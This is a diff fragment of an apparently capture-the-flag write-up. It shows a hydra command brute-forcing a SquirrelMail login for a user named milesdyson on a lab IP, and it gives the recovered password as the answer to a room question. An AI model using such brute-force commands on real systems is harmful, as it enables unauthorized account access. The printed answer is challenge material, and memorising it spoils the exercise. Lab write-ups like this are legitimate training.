@@ -74,9 +74,9 @@ I see there's nothing inside of the log2.txt and log3.txt so I remove those.<br 
 <p>Let's try bruteforcing the user "milesdyson" with the passwords we got from "log1.txt" on the squirrelmail service. 
 We know there's a vulnerability in the SquirrelMail service with an available exploit. To do this we will use hydra and burp suite.<br />
 hydra -l milesdyson -P log1.txt 10.10.90.192 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user:H=Cookie: squirrelmail_language=en_US; SQMSESSID=jbgcof2ofcgqh0jb5ukapj8pu3;"<br />
-Success! We have successfuly logged in with the password "cyborg007haloterminator"<br /></p>
+Success! We have successfuly logged in with the password "cyborg007haloterminator"<br /> </p>
 Question 1:<br />
-**What is Miles password for his emails?** cyborg007haloterminator
+**What is Miles password for his emails?** cyborg007haloterminator <br />
 
 ## Exploiting Vulnerabilities
 
